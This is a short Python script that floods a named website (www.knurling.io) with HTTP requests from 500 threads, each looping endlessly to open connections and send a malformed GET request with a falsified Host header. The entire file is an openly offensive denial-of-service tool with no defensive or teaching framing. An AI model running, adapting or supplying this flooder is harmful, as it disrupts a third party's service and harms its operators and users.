import threading
import socket

target = 'www.knurling.io'
port = 80
fake_ip = '112.91.03.32:80'

already_conntected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        
        global already_conntected
        already_conntected +=1
        print(already_conntected)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()